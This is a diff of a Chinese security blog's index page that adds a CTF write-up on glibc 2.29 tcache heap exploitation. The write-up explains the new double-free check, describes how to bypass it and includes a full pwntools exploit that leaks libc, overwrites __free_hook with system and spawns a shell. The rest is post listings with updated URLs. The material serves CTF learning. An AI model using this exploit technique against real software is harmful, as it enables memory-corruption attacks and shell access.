@@ -297,7 +297,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/23/ck79ta46p002e16u5yaw2jih9/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/03/04/ck7d9dfsx000u8eu5my2p31y2/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -316,7 +316,175 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/02/23/ck79ta46p002e16u5yaw2jih9/" itemprop="url">自己常用的vim操作</a></h1>
+                <a class="post-title-link" href="/year/03/04/ck7d9dfsx000u8eu5my2p31y2/" itemprop="url">libc2.29利用小结</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T19:38:03+08:00">
+                2020-03-04
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/漏洞分析/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞分析</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="0x0简介"><a href="#0x0简介" class="headerlink" title="0x0简介"></a>0x0简介</h2><p>libc2.29的题目又与2.27的机制有所不同这里总结下</p>
+<h2 id="0x1-新增机制"><a href="#0x1-新增机制" class="headerlink" title="0x1 新增机制"></a>0x1 新增机制</h2><p>tcache是glibc-2.26引入的一种新技术，目的是提升堆管理的性能，早期的libc对tcache基本没任何防护，简直到了为所欲为的地步，一不检查double free，二不检查size大小，使用起来比fastbins还要简单。</p>
+<p>查看glibc-2.29 malloc.c的源码，tcache_entry结构体增加了一个新指针key放在bk的位置，用于检测double free。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">  <span class="comment">/* This field exists to detect double frees.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> *<span class="title">key</span>;</span> <span class="comment">/* 新增指针 */</span></span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>
+
+<p>在之前的版本，要填满tcache非常简单粗暴，如果程序不清空指针，可以由头到尾free同一个chunk，直接把tcache填满，在2.29下这个方法不再适用。下面继续看一下tcache_put和tcache_get部分的源码，看看这个新指针起到如何的作用。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span></span><br><span class="line">tcache_put (mchunkptr chunk, <span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  <span class="comment">/* Mark this chunk as "in the tcache" so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;   <span class="comment">// 写入tcache_perthread_struct地址</span></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there's</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="keyword">static</span> __always_inline <span class="keyword">void</span> *</span><br><span class="line">tcache_get (<span class="keyword">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  assert (tc_idx &lt; TCACHE_MAX_BINS);</span><br><span class="line">  assert (tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;  <span class="comment">// 清空</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当一个属于tcache大小的chunk被free掉时，会调用tcache_put，e-&gt;key被写入tcache_perthread_struct的地址，也就是heap开头的位置。而当程序从tcache取出chunk时，会将e-&gt;key重新清空。</p>
+<p>然后再看一下_int_free中tcache部分如何进行double free检测。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">_int_free (mstate av, mchunkptr p, <span class="keyword">int</span> have_lock)</span><br><span class="line">&#123;</span><br><span class="line">  INTERNAL_SIZE_T size;        <span class="comment">/* its size */</span></span><br><span class="line">  mfastbinptr *fb;             <span class="comment">/* associated fastbin */</span></span><br><span class="line">  mchunkptr nextchunk;         <span class="comment">/* next contiguous chunk */</span></span><br><span class="line">  INTERNAL_SIZE_T nextsize;    <span class="comment">/* its size */</span></span><br><span class="line">  <span class="keyword">int</span> nextinuse;               <span class="comment">/* true if nextchunk is used */</span></span><br><span class="line">  INTERNAL_SIZE_T prevsize;    <span class="comment">/* size of previous contiguous chunk */</span></span><br><span class="line">  mchunkptr bck;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line">  mchunkptr fwd;               <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> USE_TCACHE</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">size_t</span> tc_idx = csize2tidx (size);</span><br><span class="line">    <span class="keyword">if</span> (tcache != <span class="literal">NULL</span> &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">      &#123;</span><br><span class="line">    <span class="comment">/* Check to see if it's already in the tcache.  */</span></span><br><span class="line">    tcache_entry *e = (tcache_entry *) chunk2mem (p);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This test succeeds on double free.  However, we don't 100%</span></span><br><span class="line"><span class="comment">       trust it (it also matches random payload data at a 1 in</span></span><br><span class="line"><span class="comment">       2^&lt;size_t&gt; chance), so verify it's not an unlikely</span></span><br><span class="line"><span class="comment">       coincidence before aborting.  */</span></span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (e-&gt;key == tcache)) <span class="comment">// 检查是否为tcache_perthread_struct地址</span></span><br><span class="line">      &#123;</span><br><span class="line">        tcache_entry *tmp;</span><br><span class="line">        LIBC_PROBE (memory_tcache_double_free, <span class="number">2</span>, e, tc_idx);</span><br><span class="line">        <span class="keyword">for</span> (tmp = tcache-&gt;entries[tc_idx];</span><br><span class="line">         tmp;</span><br><span class="line">         tmp = tmp-&gt;next)</span><br><span class="line">          <span class="keyword">if</span> (tmp == e)                      <span class="comment">// 检查tcache中是否有一样的chunk</span></span><br><span class="line">        malloc_printerr (<span class="string">"free(): double free detected in tcache 2"</span>);</span><br><span class="line">        <span class="comment">/* If we get here, it was a coincidence.  We've wasted a</span></span><br><span class="line"><span class="comment">           few cycles, but don't abort.  */</span></span><br><span class="line">      &#125;</span><br><span class="line">  ...</span><br></pre></td></tr></table></figure>
+
+<p>首先_int_free会检查chunk的key是否为tcache_perthread_struct地址，然后会遍历tcache，检查此chunk是否已经在tcache中，如有则触发malloc_printerr报错free(): double free detected in tcache 2。</p>
+<p>简单总结一下，2.29下tcache触发double free报错的条件为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-key == &amp;tcache_perthread_struct &amp;&amp; chunk in tcachebin[chunk_idx]</span><br></pre></td></tr></table></figure>
+
+<p>新增保护主要还是用到e-&gt;key这个属性，因此绕过想绕过检测进行double free，这里也是入手点。绕过思路有以下两个：</p>
+<ol>
+<li>如果有UAF漏洞或堆溢出，可以修改e-&gt;key为空，或者其他非tcache_perthread_struct的地址。这样可以直接绕过_int_free里面第一个if判断。不过如果UAF或堆溢出能直接修改chunk的fd的话，根本就不需要用到double free了。</li>
+<li>利用堆溢出，修改chunk的size，最差的情况至少要做到off by null。留意到_int_free里面判断当前chunk是否已存在tcache的地方，它是根据chunk的大小去查指定的tcache链，由于我们修改了chunk的size，查找tcache链时并不会找到该chunk，满足free的条件。虽然double free的chunk不在同一个tcache链中，不过不影响我们使用tcache poisoning进行攻击。</li>
+</ol>
+<h2 id="0x3-i春秋新春抗疫-Document-kn0ck"><a href="#0x3-i春秋新春抗疫-Document-kn0ck" class="headerlink" title="0x3 i春秋新春抗疫 Document(kn0ck)"></a>0x3 i春秋新春抗疫 Document(kn0ck)</h2><p>很明显的一个uaf，很好的利用了tcache的特性<br>思路就是先填满tcache，然后再泄露，利用小块的0x8内的内容写到free_hook<br>环境用的是现成的pwndocker，然后libc是用的glibc-all-in-one中下载的</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> context.log_level = <span class="string">'debug'</span></span><br><span class="line"> sh = process([<span class="string">"./ld-2.29.so"</span>, <span class="string">"./pwn"</span>], env=&#123;<span class="string">"LD_PRELOAD"</span>:<span class="string">"/home/wood/pwn/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so"</span>&#125;)</span><br><span class="line"> libc = ELF(<span class="string">'/home/wood/pwn/glibc-all-in-one/libs/2.29-0ubuntu2_amd64/libc-2.29.so'</span>)</span><br><span class="line"> context.terminal = [<span class="string">'tmux'</span>, <span class="string">'splitw'</span>, <span class="string">'-h'</span>]</span><br><span class="line"> gdb.attach(sh)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name,content)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'1'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">'input name\n'</span>)</span><br><span class="line">     sh.send(name)</span><br><span class="line">     sh.recvuntil(<span class="string">'input sex\n'</span>)</span><br><span class="line">     sh.sendline(<span class="string">'W'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"input information\n"</span>)</span><br><span class="line">     sh.send(content)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">remove</span><span class="params">(idx)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'4'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your index : \n"</span>)</span><br><span class="line">     sh.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'3'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your index : \n"</span>)</span><br><span class="line">     sh.sendline(str(idx))</span><br><span class="line">     sh.recvuntil(<span class="string">"Are you sure change sex?\n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'Y'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Now change information\n"</span>)</span><br><span class="line">     sh.send(content)</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your choice : \n"</span>)</span><br><span class="line">     sh.sendline(<span class="string">'2'</span>)</span><br><span class="line">     sh.recvuntil(<span class="string">"Give me your index : \n"</span>)</span><br><span class="line">     sh.sendline(str(idx))</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> add(<span class="string">'a'</span>*<span class="number">8</span>,<span class="string">'a'</span>*<span class="number">0x70</span>)</span><br><span class="line"> add(<span class="string">'b'</span>*<span class="number">8</span>,<span class="string">'b'</span>*<span class="number">0x70</span>)</span><br><span class="line"> add(<span class="string">'c'</span>*<span class="number">8</span>,<span class="string">'c'</span>*<span class="number">0x70</span>)</span><br><span class="line"> add(<span class="string">'d'</span>*<span class="number">8</span>,<span class="string">'d'</span>*<span class="number">0x70</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">3</span>)</span><br><span class="line"> edit(<span class="number">3</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line"> remove(<span class="number">3</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">2</span>)</span><br><span class="line"> edit(<span class="number">2</span>,<span class="string">'2'</span>*<span class="number">0x70</span>)</span><br><span class="line"> remove(<span class="number">2</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">1</span>)</span><br><span class="line"> edit(<span class="number">1</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">0</span>)</span><br><span class="line"> edit(<span class="number">0</span>,<span class="string">'1'</span>*<span class="number">0x70</span>)</span><br><span class="line"> remove(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line"> remove(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> show(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"> libc_base = u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x1e4ca0</span></span><br><span class="line"> log.success(<span class="string">"libc_base: "</span> + hex(libc_base))</span><br><span class="line"> </span><br><span class="line"> system_addr = libc_base + <span class="number">0x52fd0</span></span><br><span class="line"> free_hook = libc_base + libc.sym[<span class="string">'__free_hook'</span>]</span><br><span class="line"> log.success(<span class="string">'free_hook: '</span>+hex( free_hook))</span><br><span class="line"> log.success(<span class="string">'system: '</span> + hex(system_addr))</span><br><span class="line"> </span><br><span class="line"> add(p64(free_hook),p64(free_hook)*<span class="number">14</span>)</span><br><span class="line"> add(<span class="string">'/bin/sh\x00'</span>,<span class="string">'/bin/sh\x00'</span>*<span class="number">14</span>)</span><br><span class="line"> add(p64(system_addr),p64(system_addr)*<span class="number">14</span>)</span><br><span class="line"> remove(<span class="number">5</span>)</span><br><span class="line"> <span class="comment">#show(5)</span></span><br><span class="line"> sh.interactive()</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+      <div>
+        
+      </div>
+
+    
+
+    
+
+    
+
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/23/ck7d9dftf00298eu5tx1dizxg/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Wood">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="木头的小木屋">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/year/02/23/ck7d9dftf00298eu5tx1dizxg/" itemprop="url">自己常用的vim操作</a></h1>
         
 
         <div class="post-meta">
@@ -392,7 +560,7 @@
           <p>备忘</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/02/23/ck79ta46p002e16u5yaw2jih9/#more" rel="contents">
+            <a class="btn" href="/year/02/23/ck7d9dftf00298eu5tx1dizxg/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -448,7 +616,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/20/ck79ta46v002t16u5avve9skl/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/20/ck7d9dfti002g8eu5r04p446o/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -467,7 +635,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/02/20/ck79ta46v002t16u5avve9skl/" itemprop="url">近期杂七杂八的刷题</a></h1>
+                <a class="post-title-link" href="/year/02/20/ck7d9dfti002g8eu5r04p446o/" itemprop="url">近期杂七杂八的刷题</a></h1>
         
 
         <div class="post-meta">
@@ -543,7 +711,7 @@
           <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>就是最近刷的一些简单题</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/02/20/ck79ta46v002t16u5avve9skl/#more" rel="contents">
+            <a class="btn" href="/year/02/20/ck7d9dfti002g8eu5r04p446o/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -599,7 +767,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/19/ck79ta46s002k16u58dah4zxt/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/19/ck7d9dftj002j8eu51wfthn2l/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -618,7 +786,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/02/19/ck79ta46s002k16u58dah4zxt/" itemprop="url">pwnable-tw bookwriter</a></h1>
+                <a class="post-title-link" href="/year/02/19/ck7d9dftj002j8eu51wfthn2l/" itemprop="url">pwnable-tw bookwriter</a></h1>
         
 
         <div class="post-meta">
@@ -694,7 +862,7 @@
           <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>主要是一道house of orange，利用方法很经典，学习了</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/02/19/ck79ta46s002k16u58dah4zxt/#more" rel="contents">
+            <a class="btn" href="/year/02/19/ck7d9dftj002j8eu51wfthn2l/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -750,7 +918,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/08/ck79ta48i003b16u513hmtcd8/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/08/ck7d9dfxl00358eu5qwbeno31/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -769,7 +937,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/02/08/ck79ta48i003b16u513hmtcd8/" itemprop="url">堆的检测绕过总结</a></h1>
+                <a class="post-title-link" href="/year/02/08/ck7d9dfxl00358eu5qwbeno31/" itemprop="url">堆的检测绕过总结</a></h1>
         
 
         <div class="post-meta">
@@ -845,7 +1013,7 @@
           <h2 id="0x0-简介"><a href="#0x0-简介" class="headerlink" title="0x0 简介"></a>0x0 简介</h2><p>这里总结一下堆里面安全性的检测和如何绕过</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/02/08/ck79ta48i003b16u513hmtcd8/#more" rel="contents">
+            <a class="btn" href="/year/02/08/ck7d9dfxl00358eu5qwbeno31/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -901,7 +1069,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/08/ck79ta45r001016u5qmews14x/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/08/ck7d9dfxt003b8eu5otfietii/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -920,7 +1088,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/02/08/ck79ta45r001016u5qmews14x/" itemprop="url">IO_file 总结</a></h1>
+                <a class="post-title-link" href="/year/02/08/ck7d9dfxt003b8eu5otfietii/" itemprop="url">IO_file 总结</a></h1>
         
 
         <div class="post-meta">
@@ -1000,7 +1168,7 @@
 <p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/io_file/introduction-zh/</a></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/02/08/ck79ta45r001016u5qmews14x/#more" rel="contents">
+            <a class="btn" href="/year/02/08/ck7d9dfxt003b8eu5otfietii/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1056,7 +1224,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/02/ck79ta48j003c16u5m53xzr3i/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/02/02/ck7d9dfxl00348eu57zi69qxu/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1075,7 +1243,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/02/02/ck79ta48j003c16u5m53xzr3i/" itemprop="url">驱动开发初探</a></h1>
+                <a class="post-title-link" href="/year/02/02/ck7d9dfxl00348eu57zi69qxu/" itemprop="url">驱动开发初探</a></h1>
         
 
         <div class="post-meta">
@@ -1151,7 +1319,7 @@
           <h2 id="0x0-前言"><a href="#0x0-前言" class="headerlink" title="0x0 前言"></a>0x0 前言</h2><p>驱动开发的环境配置，以及入门的hello_world<br>参考链接: <a href="https://qwertwwwe.github.io/windows-driver-develop-setup-environment/" target="_blank" rel="noopener">https://qwertwwwe.github.io/windows-driver-develop-setup-environment/</a></p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/02/02/ck79ta48j003c16u5m53xzr3i/#more" rel="contents">
+            <a class="btn" href="/year/02/02/ck7d9dfxl00348eu57zi69qxu/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1207,7 +1375,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/30/ck79ta45f000816u5zpytxf9k/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/30/ck7d9dft100118eu54cnaghse/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1226,7 +1394,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/30/ck79ta45f000816u5zpytxf9k/" itemprop="url">Tcache Attack 总结</a></h1>
+                <a class="post-title-link" href="/year/01/30/ck7d9dft100118eu54cnaghse/" itemprop="url">Tcache Attack 总结</a></h1>
         
 
         <div class="post-meta">
@@ -1302,7 +1470,7 @@
           <h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>好像这个新版本的tcache安全性更差了，也不知道为啥这样改</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/30/ck79ta45f000816u5zpytxf9k/#more" rel="contents">
+            <a class="btn" href="/year/01/30/ck7d9dft100118eu54cnaghse/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1358,7 +1526,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/30/ck79ta46i002016u5t55i2d36/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/30/ck7d9dfry00048eu5i1j0kj3e/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1377,7 +1545,7 @@
         
           <h1 class="post-title" itemprop="name headline">
                 
-                <a class="post-title-link" href="/year/01/30/ck79ta46i002016u5t55i2d36/" itemprop="url">docker 初探</a></h1>
+                <a class="post-title-link" href="/year/01/30/ck7d9dfry00048eu5i1j0kj3e/" itemprop="url">docker 初探</a></h1>
         
 
         <div class="post-meta">
@@ -1453,7 +1621,7 @@
           <h2 id="0x0-Docker是什么"><a href="#0x0-Docker是什么" class="headerlink" title="0x0 Docker是什么"></a>0x0 Docker是什么</h2><p>Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。它是目前最流行的 Linux 容器解决方案。</p>
           <!--noindex-->
           <div class="post-button text-center">
-            <a class="btn" href="/year/01/30/ck79ta46i002016u5t55i2d36/#more" rel="contents">
+            <a class="btn" href="/year/01/30/ck7d9dfry00048eu5i1j0kj3e/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1509,7 +1677,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/24/ck79ta45o000p16u5b1pxa2m2/">
+    <link itemprop="mainEntityOfPage" href="wood1314.github.io/year/01/24/ck7d9dfxn00378eu51qusewxf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Wood">
@@ -1528,7 +1696,7 @@
         
